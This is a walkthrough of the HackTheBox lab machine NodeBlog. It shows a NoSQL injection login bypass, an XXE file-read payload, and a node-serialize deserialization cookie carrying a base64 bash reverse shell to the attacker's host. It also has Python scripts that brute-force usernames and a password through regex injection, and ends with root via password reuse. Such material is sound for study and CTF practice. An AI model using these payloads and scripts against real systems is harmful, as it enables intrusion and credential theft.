---
title: HTB: NodeBlog
url: https://0xdf.gitlab.io/2022/01/10/htb-nodeblog.html
date: 2022-01-10T10:00:00+00:00
difficulty: Easy [20]
os: Linux
tags: ctf, htb-nodeblog, hackthebox, uhc, youtube, python, nmap, feroxbuster, nodejs, nosql-injection, payloadsallthethings, xxe, node-serialize, deserialization, json-deserialization, mongo, mongodump, bsondump
---

![NodeBlog](https://0xdfimages.gitlab.io/img/nodeblog-cover.png)

This UHC qualifier box was a neat take on some common NodeJS vulnerabilities. First there’s a NoSQL authentication bypass. Then I’ll use XXE in some post upload ability to leak files, including the site source. With that, I’ll spot a deserialization vulnerability which I can abuse to get RCE. I’ll get the user’s password from Mongo via the shell or through the NoSQL injection, and use that to escalate to root. In Beyond Root, a look at characters that broke the deserialization payload, and scripting the NoSQL injection.

## Box Info

| Name | [NodeBlog](https://hackthebox.com/machines/nodeblog)  [NodeBlog](https://hackthebox.com/machines/nodeblog) [Play on HackTheBox](https://hackthebox.com/machines/nodeblog) |
| --- | --- |
| Release Date | 10 Jan 2022 |
| Retire Date | 10 Jan 2022 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [ippsec ippsec](https://app.hackthebox.com/users/3769) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.139
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-09 13:30 EST
Nmap scan report for 10.10.11.139
Host is up (0.10s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
oxdf@parrot$ nmap -p 22,5000 -sCV -oA scans/nmap-tcpscripts 10.10.11.139
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-09 13:33 EST
Nmap scan report for 10.10.11.139
Host is up (0.092s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.49 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 Focal. The site is (unsurprisingly based on the box name) running NodeJS.

### Website - TCP 80

#### Site

The page is a blog about UHC with a single article:

![image-20220110115720971](https://0xdfimages.gitlab.io/img/image-20220110115720971.png)

Clicking “Read More” leads to `http://10.10.11.139:5000/articles/uhc-qualifiers`, which is the full post with some links, all of which lead to publics sites (out of scope):

![image-20220109134724240](https://0xdfimages.gitlab.io/img/image-20220109134724240.png)

The “Login” button leads to `/login`, which is a login form:

![image-20220110115752224](https://0xdfimages.gitlab.io/img/image-20220110115752224.png)

#### Tech Stack

`nmap` identified the site is running NodeJS with Express. The response headers confirm that, but don’t indicate much else:

```

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 1891
ETag: W/"763-yBLqx1Bg/Trp0SZ2cyMSGFoH5nU"
Date: Sun, 09 Jan 2022 22:49:52 GMT
Connection: close

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@parrot$ feroxbuster -u http://10.10.11.139:5000

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.139:5000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       28l       59w     1002c http://10.10.11.139:5000/login
200       28l       59w     1002c http://10.10.11.139:5000/Login
200       28l       59w     1002c http://10.10.11.139:5000/LOGIN
[####################] - 58s    29999/29999   0s      found:3       errors:0
[####################] - 58s    29999/29999   515/s   http://10.10.11.139:5000

```

Nothing I don’t already know about.

## Shell as admin

### Auth Bypass Via NoSQL Injection

Some basic SQL injections didn’t do anything, nor did a quick `sqlmap` run against the login form.

Testing for NoSQL injection is a bit trickier than some of the simple checks for SQL injection. PayloadsAllTheThings has a [good section of payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass) for NoSQL auth bypass to keep as a handy reference for the things I’ll show here. Here we want Node to handle the input as a JSON object. The page by default is submitting as a HTML form (this is set by the `Content-Type` header in the request):

```

POST /login HTTP/1.1
Host: 10.10.11.139:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://10.10.11.139:5000
Connection: close
Referer: http://10.10.11.139:5000/login
Upgrade-Insecure-Requests: 1

user=admin&password=wrongpassword

```

In this format, I can try adding changing the data to:

```

user=admin&password[$ne]=wrongpassword

```

If the server interprets that how I want, it would make it look for records where the password was not equal to “wrongpassword”, which would return the admin record.

I’ll send the login POST request to Burp Repeater and give this a try, but it doesn’t work.

The other way that data can be sent is as JSON. I’ll change the `Content-Type` header, and then convert the body to JSON (first without any injection to make sure the site processed it correctly):

```

POST /login HTTP/1.1
Host: 10.10.11.139:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 46
Origin: http://10.10.11.139:5000
Connection: close
Referer: http://10.10.11.139:5000/login
Upgrade-Insecure-Requests: 1

{"user": "admin", "password": "wrongpassword"}

```

Sending that does return the “Invalid Password” message, which shows that the username was processed and matched. I’ll replace the string “wrongpassword” with a JSON object that uses the `$ne` operator to look for records that have the username admin and don’t have that password:

```

{"user": "admin", "password": {"$ne": "wrongpassword"}}

```

On sending that, the response comes back with a cookie, which is a good indication I’ve successfully logged in.

I can grab that cookie and add it to Firefox using the dev tools. Alternatively, I could turn intercept on in Burp, submit the login from Firefore, modify it the same way as I did in Repeater, and then forward it. Either way, I have a logged in session in Firefox:

![image-20220110115840824](https://0xdfimages.gitlab.io/img/image-20220110115840824.png)

The auth bypass was all I need from this NoSQL injection, but I can also dump out the usernames and passwords from the database. I’ll show this in [Beyond Root](#nosql-data-collection).

### XXE File Read

#### Site Enumeration

The logged in site has a few more buttons. “New Article” leads to `/articles/new`, which is a form for creating a new article:

![image-20220110080833417](https://0xdfimages.gitlab.io/img/image-20220110080833417.png)

I tried submitting an article, and it worked:

![image-20220110083732854](https://0xdfimages.gitlab.io/img/image-20220110083732854.png)

I can edit articles and delete them as well.

There’s also the “Upload” button. Clicking it pops the file selection interface from my OS. Sending a file returns:

![image-20220110084031580](https://0xdfimages.gitlab.io/img/image-20220110084031580.png)

Looking at the response, it’s a bit clearer (as Firefox was treating tags as HTML):

```

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 144
ETag: W/"90-v0DoTdXwQk7iInwC6sdbQSWTk3E"
Date: Mon, 10 Jan 2022 17:49:14 GMT
Connection: close

Invalid XML Example: <post><title>Example Post</title><description>Example Description</description><markdown>Example Markdown</markdown></post>

```

I created a dummy XML file of the format the server sent:

```

<post>
        <title>0xdf's Post</title>
        <description>A post from 0xdf</description>
        <markdown>
## post
This is a test post.
        </markdown>
</post>

```

On uploading that, it leads to `/articles/xml`, with what looks like a submission form already filled in:

![image-20220110090421985](https://0xdfimages.gitlab.io/img/image-20220110090421985.png)

#### XXE

The site is clearly accepting XML and parsing that into the form to display back to me. This is a classic opportunity for an XML External Entity (XXE) injection - I’ll see if I can get the XML process to process my input in such a way that it handles it as code. It’s a similar class of bug to SSTI (template injection) and even Log4j.

PayloadsAllTheThings has a lot of [example payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files) for XXE as well. I’ll grab the first one and try to read `/etc/passwd`. I can’t just submit it as is though, I have to work from the template that the site is expecting. I’ll update my XML file to:

```

<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<post>
        <title>0xdf's Post</title>
        <description>Read File</description>
        <markdown>&file;</markdown>
</post>

```

This defines the entity `&file;` as the contents of `/etc/passwd`, and then references it in the markdown field. When I submit this, it works:

![image-20220110123114923](https://0xdfimages.gitlab.io/img/image-20220110123114923.png)

### Find Source Location

After not finding much of interest in various files, I found myself trying to crash the site. Errors in the XML just lead to the example payload. Errors in the urls give simple messages like `Cannot GET /a`. One thing that did work was sending busted JSON to to `/login`:

```

POST /login HTTP/1.1
Host: 10.10.11.139:5000
Content-Type: application/json
Content-Length: 1

{

```

The response included a stack trace:

![image-20220110131328282](https://0xdfimages.gitlab.io/img/image-20220110131328282.png)

It seems the source for the webapp is running in `/opt/blog`.

### Deserialization

#### Source Analysis

I’ll find the source for the application at `/opt/blog/server.js` (`server.js` is a common name for a Node application).

```

const express = require('express')
const mongoose = require('mongoose')
const Article = require('./models/article')
const articleRouter = require('./routes/articles')
const loginRouter = require('./routes/login')
const serialize = require('node-serialize')
const methodOverride = require('method-override')
const fileUpload = require('express-fileupload')
const cookieParser = require('cookie-parser');
const crypto = require('crypto')
const cookie_secret = "UHC-SecretCookie"
//var session = require('express-session');
const app = express()

mongoose.connect('mongodb://localhost/blog')

app.set('view engine', 'ejs')
app.use(express.urlencoded({ extended: false }))
app.use(methodOverride('_method'))
app.use(fileUpload())
app.use(express.json());
app.use(cookieParser());
//app.use(session({secret: "UHC-SecretKey-123"}));

function authenticated(c) {
    if (typeof c == 'undefined')
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){
        return true
    } else {
        return false
    }
}

app.get('/', async (req, res) => {
    const articles = await Article.find().sort({
        createdAt: 'desc'
    })
    res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
})

app.use('/articles', articleRouter)
app.use('/login', loginRouter)

app.listen(5000)

```

What jumps out to me is the import of `node-serialize`, which implies serialization is in use, which is always a risky path.

The `unserialize` function is being called on `c`, which is likely the cookie. Looking at the cookie, it’s clearly URL encoded JSON:

```

%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D

```

This decodes to:

```

{"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}

```

It is worth noting that all the non-letters/digits in the cookie are URL encoded.

#### Exploit POC

[This blog post](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) does a nice job writing up the path to exploit node-serialize. The example payload they give is:

```

{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /',
function(error, stdout, stderr) { console.log(stdout) });}()"}

```

The source code makes it clear that this is checked before the `user` or `sign` fields, so I can just make this my cookie. I’ll start with:

```

{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.14.8', function(error, stdout, stderr){console.log(stdout)});}()"}

```

This URL encodes to:

```

%7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%28%29%7b%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%70%69%6e%67%20%2d%63%20%31%20%31%30%2e%31%30%2e%31%34%2e%38%27%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%7d%29%3b%7d%28%29%22%7d

```

It is important to URL encode (I’ll look at why I need to URL encode this in [Beyond Root](#bad-characters-in-deserialization-payload)).

I’ll start `tcpdump`, and send this in repeater, which leads to ICMP packets:

```

oxdf@parrot$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
13:37:28.886060 IP 10.10.11.139 > 10.10.14.8: ICMP echo request, id 1, seq 1, length 64
13:37:28.886083 IP 10.10.14.8 > 10.10.11.139: ICMP echo reply, id 1, seq 1, length 64

```

#### Shell

I played with a few things, but ended up getting a base64 encoded bash reverse shell to work. I created it in my own terminal:

```

oxdf@parrot$ echo 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0MyAwPiYxCg==

```

Then tested that it worked by running and making sure it connected:

```

oxdf@parrot$ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0MyAwPiYxCg==|base64 -d|bash

```

Then reset `nc` and put the payload into the GET request:

```

GET / HTTP/1.1
Host: 10.10.11.139:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: auth=%7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%28%29%7b%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%34%4c%7a%51%30%4d%79%41%77%50%69%59%78%43%67%3d%3d%7c%62%61%73%65%36%34%20%2d%64%7c%62%61%73%68%27%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%7d%29%3b%7d%28%29%22%7d
Upgrade-Insecure-Requests: 1
Set-GPC: 1

```

On sending in Repeater, I got a shell:

```

oxdf@parrot$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.139 38464
bash: cannot set terminal process group (849): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

bash: /home/admin/.bashrc: Permission denied
admin@nodeblog:/opt/blog$

```

I’ll upgrade it using the `script` trick:

```

admin@nodeblog:/opt/blog$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

bash: /home/admin/.bashrc: Permission denied
admin@nodeblog:/opt/blog$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
admin@nodeblog:/opt/blog$

```

### user.txt

At least on initial deploy to HTB, the machine went out with strange permissions on `/home/admin`. This is first visible when I load the shell and get an error: “bash: /home/admin/.bashrc: Permission denied”.

The directory is set to 644:

```

admin@nodeblog:/home$ ls -l
total 0
drw-r--r-- 1 admin admin 220 Jan  3 17:16 admin

```

Without `x` on the dir, I can’t go into it. Interestingly, even though `user.txt` is readable by admin, I can’t read it:

```

admin@nodeblog:/home$ cat admin/user.txt
cat: admin/user.txt: Permission denied

```

But, as admin is the owner of the directory, I can change the permissions, and get the flag:

```

admin@nodeblog:/home$ chmod +x admin/
admin@nodeblog:/home$ cd admin/
admin@nodeblog:~$ cat user.txt
621989e8************************

```

This may be fixed, but it was an interesting exploration of Linux file permissions.

## Shell as root

### Enumeration

#### General

There’s nothing else of interest in `/home/admin`. `sudo` requests a password for the admin user:

```

admin@nodeblog:~$ sudo -l     
[sudo] password for admin: 

```

Looking at what is running on the host, I’ll see `mongod`:

```

admin@nodeblog:~$ ps auxww
...[snip]...
mongodb      693  0.3  1.8 983884 76276 ?        Ssl  Jan10   0:39 /usr/bin/mongod --unixSocketPrefix=/run/mongodb --config /etc/mongodb.conf
...[snip]...

```

That config shows it’s listening on the default port of 27017, which is in the `netstat`:

```

admin@nodeblog:~$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::5000                 :::*                    LISTEN      849/node /opt/blog/ 

```

#### Mongo

There’s a few ways to get data from Mongo. `mongo` will connect to a local instance with no additional parameters:

```

admin@nodeblog:~$ mongo
MongoDB shell version v3.6.8
connecting to: mongodb://127.0.0.1:27017
Implicit session: session { "id" : UUID("6c8944d0-e1f8-4ccb-9613-a4bec8925cb1") }
MongoDB server version: 3.6.8
Server has startup warnings: 
2022-01-10T21:09:16.064+0000 I CONTROL  [initandlisten] 
2022-01-10T21:09:16.064+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2022-01-10T21:09:16.064+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2022-01-10T21:09:16.064+0000 I CONTROL  [initandlisten] 
> 

```

I can show the databases:

```

> show dbs
admin   0.000GB
blog    0.000GB
config  0.000GB
local   0.000GB

```

All of those except for `blog` are [default dbs in Mongo](https://www.mysoftkey.com/mongodb/3-default-database-in-mongodb/). I’ll look at `blog`:

```

> use blog
switched to db blog
> show collections
articles
users

```

Two collections, the `users` obviously of more interest as it could contain auth information. In fact, it has the plaintext password for admin:

```

> db.users.find()
{ "_id" : ObjectId("61b7380ae5814df6030d2373"), "createdAt" : ISODate("2021-12-13T12:09:46.009Z"), "username" : "admin", "password" : "IppsecSaysPleaseSubscribe", "__v" : 0 }

```

Another way to get to this same information would be with `mongodump`. From an empty directory, I’ll run it:

```

admin@nodeblog:/dev/shm$ mongodump 
2022-01-11T00:41:49.300+0000    writing admin.system.version to 
2022-01-11T00:41:49.301+0000    done dumping admin.system.version (1 document)
2022-01-11T00:41:49.301+0000    writing blog.articles to 
2022-01-11T00:41:49.301+0000    writing blog.users to 
2022-01-11T00:41:49.301+0000    done dumping blog.articles (2 documents)
2022-01-11T00:41:49.301+0000    done dumping blog.users (1 document)

```

All the data was written to files in `dump`:

```

admin@nodeblog:/dev/shm$ ls
dump  multipath
admin@nodeblog:/dev/shm$ ls dump/
admin  blog

```

There are four files in `blog`:

```

admin@nodeblog:/dev/shm$ ls dump/blog/
articles.bson  articles.metadata.json  users.bson  users.metadata.json

```

The `metadata.json` files aren’t interesting. And the `.bson` files are binary:

```

admin@nodeblog:/dev/shm$ xxd dump/blog/users.bson 
00000000: 6e00 0000 075f 6964 0061 b738 0ae5 814d  n...._id.a.8...M
00000010: f603 0d23 7309 6372 6561 7465 6441 7400  ...#s.createdAt.
00000020: 19e7 b2b3 7d01 0000 0275 7365 726e 616d  ....}....usernam
00000030: 6500 0600 0000 6164 6d69 6e00 0270 6173  e.....admin..pas
00000040: 7377 6f72 6400 1a00 0000 4970 7073 6563  sword.....Ippsec
00000050: 5361 7973 506c 6561 7365 5375 6273 6372  SaysPleaseSubscr
00000060: 6962 6500 105f 5f76 0000 0000 0000       ibe..__v......

```

While I can get the password out of that, `bsondump` will make it nice to read:

```

admin@nodeblog:/dev/shm$ bsondump dump/blog/users.bson
{"_id":{"$oid":"61b7380ae5814df6030d2373"},"createdAt":{"$date":"2021-12-13T12:09:46.009Z"},"username":"admin","password":"IppsecSaysPleaseSubscribe","__v":0}
2022-01-11T00:43:37.566+0000    1 objects found

```

### sudo su

It turns out that admin reuses their password between the website and the host, as it works when `sudo` prompts:

```

admin@nodeblog:/dev/shm$ sudo -l
[sudo] password for admin: 
Matching Defaults entries for admin on nodeblog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on nodeblog:
    (ALL) ALL
    (ALL : ALL) ALL

```

And, admin can run anything as root. `sudo su` will return a root shell:

```

admin@nodeblog:/dev/shm$ sudo su
root@nodeblog:/dev/shm#

```

And I can read `root.txt`:

```

root@nodeblog:~# cat root.txt
8c01d129************************

```

## Beyond Root

### Bad Characters in Deserialization Payload

For the deserialization payload, when I used ctrl-u to “encode key characters” in Burp, the payload didn’t work. When I encoded all the characters, it did. I wanted to figure out what was breaking it. I’ll explore a bit in [this video](https://www.youtube.com/watch?v=MT3wwqIAU1c):

The answer is two things. With no encoding, it breaks because of the `;`. That signifies the end of the cookie in HTTP, and thus breaks things. So when I ctrl-u, that is fixed. But ctrl-u also replaces spaces with `+`, which seems to break this application as well. On replacing those with either spaces or `%20`, the payload works fine.

Moral of the story - pay attention to the encoding.

### NoSQL Data Collection

I was able to use the NoSQL injection to bypass auth on the login form. I could also use that to enumerate at least the fields used in the query. I started with a script that would give me all the accounts on the box.

```

#!/usr/bin/env python3

import requests
import string

def brute_username(user):
    for c in string.ascii_lowercase:
        print(f'\r{user}{c:<50}', end='')
        payload = { 'user':
                       { '$regex' : f'^{user}{c}' },
                    'password': '0xdf'
                  }
        resp = requests.post('http://10.10.11.139:5000/login', json=payload)

        if 'Invalid Password' in resp.text:
            payload = {'user': f'{user}{c}', 'password': '0xdf'}
            resp = requests.post('http://10.10.11.139:5000/login', json=payload)
            if 'Invalid Password' in resp.text:
                print(f'\r{user}{c}')
            brute_username(f'{user}{c}')

brute_username('')
print('\r', end='')

```

It is a recursive function that tries the current string plus one new character and uses regex search to see if there’s a user that starts with that pattern. If there is, it checks if that new string is a valid user, and if so, prints it. It then continues checking for next characters either way. That’s important to catch if there’s both admin and administrator, for example.

It turns out there’s only one user, admin:

![](https://0xdfimages.gitlab.io/img/nodeblog-brute-users.gif)

I’ll write another quick script that will take a username and get the password. I originally skipped past this assuming that the password would be a hash I didn’t need yet. Only later did I find that it was a cleartext password that I needed to solve the box.

This time I know there’s only one valid password for the given user, so I can use a simple `while` loop until I find it:

```

#!/usr/bin/env python3

import requests
import string
import sys

user = sys.argv[1]
password = ''
found = False

while not found:
    for c in string.ascii_letters + string.digits + '!@#$%^&,':
        print(f'\r{password}{c:<50}', end='')
        payload = { 'user': user,
                    'password':
                       { '$regex' : f'^{password}{c}' },
                  }
        resp = requests.post('http://10.10.11.139:5000/login', json=payload)

        if not 'Invalid Password' in resp.text:
            payload = {'user': user, 'password': password + c}
            resp = requests.post('http://10.10.11.139:5000/login', json=payload)
            password += c
            if not 'Invalid Password' in resp.text:
                print(f'\r{password}')
                found = True
            break

```

It finds the password pretty quickly:

![](https://0xdfimages.gitlab.io/img/nodeblog-brute-password.gif)